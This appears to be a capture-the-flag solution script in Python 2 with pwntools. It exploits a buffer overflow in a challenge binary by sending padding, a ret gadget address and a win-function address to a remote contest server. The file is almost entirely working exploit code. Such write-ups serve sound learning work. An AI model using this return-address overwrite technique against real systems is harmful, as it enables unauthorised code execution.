#!/usr/bin/env python2

# Buffer overflow, can write EIP + 4 bytes after that
# The EIP must be less than or equal to a block of code before the win function
# Solution: find a ret gadget below, then put the win function after that

from pwn import *

#r = process("./return")
r = remote("chal1.swampctf.com", 1802)
buf = "a" * 42 + p32(0x08048433) + p32(0x080485DB)

r.sendline(buf)

print r.recvall()
